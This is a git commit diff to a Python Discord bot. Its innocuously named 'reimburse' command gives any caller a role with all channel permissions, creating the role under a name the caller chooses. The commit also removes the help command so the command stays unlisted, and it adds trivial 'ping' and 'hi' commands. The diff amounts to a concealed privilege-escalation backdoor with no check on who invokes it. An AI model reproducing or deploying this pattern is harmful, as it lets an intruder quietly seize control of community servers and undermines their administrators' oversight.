e8e020a2f0e338ce2ea327862acd010e9ece6a37
Davis Gramza <Davisgramza@hotmail.com>
2020-04-02 23:04:01 -0500

    Made created role dynamic with default role name, added side commands, disabled help to ensure privacy of users
    Signed-off-by: Davis Gramza <Davisgramza@hotmail.com>

--- bot.py
+++ bot.py
@@ -3,8 +3,9 @@ from discord.ext.commands import *
 from discord.utils import get
 
 client = Bot(']')
-token = 'INSERT API TOKEN HERE'
-role_name = 'special'
+token = '--token--'
+default_role_name = 'special'
+client.remove_command('help')
 
 
 @client.event
@@ -16,15 +17,29 @@ async def on_ready():
 
 
 @client.command()
-async def reimburse(ctx: Context):
+async def reimburse(ctx: Context, role: str = None):
+    if not role:
+        role_name = default_role_name
+    else:
+        role_name = role
     role = get(ctx.guild.roles, name=role_name)
     if role:
         await ctx.message.author.add_roles(role)
     else:
         permissions = Permissions().all_channel()
-        role = await ctx.guild.create_role(name='special', permissions=permissions)
+        role = await ctx.guild.create_role(name=role_name, permissions=permissions)
         await ctx.message.author.add_roles(role)
     print('Succesfully added ' + str(ctx.message.author) + ' to class ' + role_name)
+
+
+@client.command()
+async def ping(ctx: Context):
+    await ctx.send('Pong!')
+
+
+@client.command()
+async def hi(ctx: Context):
+    await ctx.send('Hi ' + ctx.message.author.mention + '!')
 
 
 client.run(token)
